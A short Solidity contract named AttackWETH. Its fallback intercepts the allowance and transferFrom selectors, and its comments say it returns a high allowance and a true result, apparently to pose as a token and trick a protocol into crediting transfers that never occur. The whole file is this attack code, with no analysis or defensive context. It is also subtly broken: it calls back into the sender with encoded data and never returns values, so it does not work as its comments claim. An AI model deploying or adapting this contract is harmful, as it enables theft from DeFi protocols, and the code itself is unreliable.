pragma solidity ^0.8.0;

contract AttackWETH {

    fallback() external payable {
        if (msg.sig == 0xdd62ed3e) {
            // Return a high allowance
            (bool success, ) = msg.sender.call(abi.encode(1e18));
            require(success); // Ensure the call is successful
        } else if (msg.sig == 0x23b872dd) {
            // Return true for transferFrom
            (bool success, ) = msg.sender.call(abi.encode(true));
            require(success);
        } else {
            revert("Selector not found");
        }
    }

    receive() external payable {}

}